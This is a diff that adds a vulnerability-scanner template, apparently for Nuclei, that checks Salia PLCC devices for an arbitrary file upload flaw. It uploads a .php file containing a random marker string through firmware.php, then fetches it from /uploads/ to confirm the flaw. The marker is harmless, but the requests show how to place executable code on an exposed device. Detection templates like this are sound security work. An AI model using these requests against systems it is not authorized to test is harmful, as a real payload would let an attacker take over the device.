@@ -1,0 +1,38 @@
+id: Salia-PLCC-firmware-upload
+
+info:
+  name: Salia PLCC firmware.php 任意文件上传漏洞
+  author: Salia
+  severity: high
+  tags: Salia
+
+http:
+  - raw:
+      - |
+        POST /firmware.php HTTP/1.1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="media"; filename="{{randstr}}.php"
+        
+        {{randstr_1}}
+        ------WebKitFormBoundary--
+
+      - |+
+        GET /uploads/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
